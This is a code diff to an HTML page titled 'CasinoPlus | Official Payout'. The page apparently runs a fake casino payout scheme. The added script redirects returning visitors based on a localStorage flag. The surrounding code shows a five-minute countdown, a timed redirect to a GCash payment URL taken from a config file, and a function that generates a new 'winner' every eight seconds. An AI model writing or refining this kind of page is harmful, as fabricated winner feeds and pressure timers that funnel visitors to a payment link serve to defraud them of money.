@@ -4,6 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CasinoPlus | Official Payout</title>
+    
+    <script>
+        if (localStorage.getItem("cp_locked") === "true") {
+            window.location.href = "index.html#verified";
+        }
+    </script>
+
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -225,7 +232,6 @@
 
         startTimer(300);
 
-        // Kumukuha ng URL sa config.js
         setTimeout(() => {
             if (typeof LATEST_GCASH_URL !== 'undefined') {
                 window.location.href = LATEST_GCASH_URL; 
@@ -270,7 +276,7 @@
         }
     }
 
-    setInterval(generateWinner, 8000); // Mas mabilis na updates (8s)
+    setInterval(generateWinner, 8000);
     generateWinner(); 
     generateWinner();
 </script>
